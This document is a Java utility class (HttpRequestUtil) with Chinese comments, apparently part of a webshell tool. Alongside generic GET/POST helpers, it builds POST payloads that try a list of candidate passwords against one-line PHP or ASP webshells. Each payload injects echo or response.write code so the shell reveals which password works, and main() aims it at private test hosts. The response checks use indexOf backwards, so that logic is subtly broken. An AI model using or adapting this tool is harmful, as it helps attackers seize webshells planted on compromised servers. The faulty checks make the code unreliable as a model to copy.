package com.secquan.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.Map;

public class HttpRequestUtil {
    /**
     * 向指定URL发送GET方法的请求
     * 
     * @param url
     *            发送请求的URL
     * @param param
     *            请求参数，请求参数应该是 name1=value1&name2=value2 的形式。
     * @return URL 所代表远程资源的响应结果
     */
    public static String sendGet(String url, String param) {
        String result = "";
        BufferedReader in = null;
        try {
            String urlNameString = url + "?" + param;
            URL realUrl = new URL(urlNameString);
            // 打开和URL之间的连接
            URLConnection connection = realUrl.openConnection();
            // 设置通用的请求属性
            connection.setRequestProperty("accept", "*/*");
            connection.setRequestProperty("connection", "Keep-Alive");
            connection.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            // 建立实际的连接
            connection.connect();
            // 获取所有响应头字段
            Map<String, List<String>> map = connection.getHeaderFields();
            // 遍历所有的响应头字段
            for (String key : map.keySet()) {
                System.out.println(key + "--->" + map.get(key));
            }
            // 定义 BufferedReader输入流来读取URL的响应
            in = new BufferedReader(new InputStreamReader(
                    connection.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("发送GET请求出现异常！" + e);
            e.printStackTrace();
        }
        // 使用finally块来关闭输入流
        finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return result;
    }

    /**
     * 向指定 URL 发送POST方法的请求
     * 
     * @param url
     *            发送请求的 URL
     * @param param
     *            请求参数，请求参数应该是 name1=value1&name2=value2 的形式。
     * @return 所代表远程资源的响应结果
     */
    public static String sendPost(String url, String param) {
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url);
            // 打开和URL之间的连接
            URLConnection conn = realUrl.openConnection();
            // 设置通用的请求属性
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            // 发送POST请求必须设置如下两行
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(3000); // 设置超时时间
            // 获取URLConnection对象对应的输出流
            out = new PrintWriter(conn.getOutputStream());
            // 发送请求参数
            out.print(param);
            // flush输出流的缓冲
            out.flush();
            // 定义BufferedReader输入流来读取URL的响应
            in = new BufferedReader(
                    new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！"+e);
            
            e.printStackTrace();
            // 返回错误消息
            return "ERROR "+e.toString();
        }
        //使用finally块来关闭输出流、输入流
        finally{
            try{
                if(out!=null){
                    out.close();
                }
                if(in!=null){
                    in.close();
                }
            }
            catch(IOException ex){
                ex.printStackTrace();
            }
        }
        return result;
    }   
    
    /**
     * 根绝类型整理参数格式
     * @param list 参数列表
     * @param type php 还是asp
     * @return
     */
    public static String organizePassword(List list,String type){
    	StringBuffer sb = new StringBuffer();
    	String str = new String();
    	// 如果是ASP
    	if(type.equals("ASP")){
    		for (int i =0;i<list.size();i++){
        		sb.append(list.get(i)+"=response.write(\"password is :"+list.get(i)+"\")");
        		sb.append("&");
        	}
    	}
    	// 如果是php
    	if(type.equals("PHP")){
    		for (int i =0;i<list.size();i++){
        		sb.append("&");
        		sb.append(list.get(i)+"=echo 'password is :"+list.get(i)+"'");
        		sb.append(";");
        	}
        	
    	}
    	str = sb.toString();
    	
    	return str;
    }
    
    
    /**
     * 准备发送数据到服务器 组织参数
     * @param url
     * @param list
     * @param type
     * @return
     */
    public static String realyPost(String url,List list,String type){
    	String str =  new String();
    	String msg = new String();
    	// 如果是asp 或者php
    	if(type.equals("ASP") || type.equals("PHP")){
    		str = HttpRequestUtil.organizePassword(list, type);
        	msg = HttpRequestUtil.sendPost(url,str);
        	if ("password is ".indexOf(msg) < 0){
        		return msg;
        	}
        	// 如果返回错误
        	if("ERROR ".indexOf(msg)>0){
        		return msg;
        	}
    	}
    	// 如果是其他
    	if(type.equals("UnKnow")){
    		
        	
        	str = HttpRequestUtil.organizePassword(list, "PHP");
        	msg = HttpRequestUtil.sendPost(url,str);
        	if ("password is ".indexOf(msg) < 0){
        		return msg;
        	}
        	// 如果返回错误
        	if("ERROR ".indexOf(msg)>0){
        		return msg;
        	}
        	str = HttpRequestUtil.organizePassword(list, "ASP");
        	msg = HttpRequestUtil.sendPost(url,str);
        	if ("password is ".indexOf(msg) < 0){
        		return msg;
        	}
        	// 如果返回错误
        	if("ERROR ".indexOf(msg)>0){
        		return msg;
        	}
    	}
    	
    	
    	return "";
    }
    
    public static void main(String[] args) {
//        //发送 GET 请求
//        //String s=HttpRequestUtil.sendGet("http://192.168.1.127/test.php", "Cknife=echo 'password is Cknife';&123=echo 'password is 123';&admin=echo 'password is admin';&1=echo 'password is 1';&pass=echo 'password is pass';&test=echo 'password is test';");
//    	String s=HttpRequestUtil.sendPost("http://192.168.1.127/test.php", "Cknife=echo 'password is Cknife';&123=echo 'password is 123';&admin=echo 'password is admin';&1=echo 'password is 1';&pass=echo 'password is pass';&test=echo 'password is test';");
//    	System.out.println(s);
//        System.out.println("==============");
//        //发送 POST 请求
        String sr=HttpRequestUtil.sendPost("http://192.168.1.70:811/test/a.asp", "Cknife=response.write(\"password is :Cknife1\");");
        System.out.println(sr);
    }
}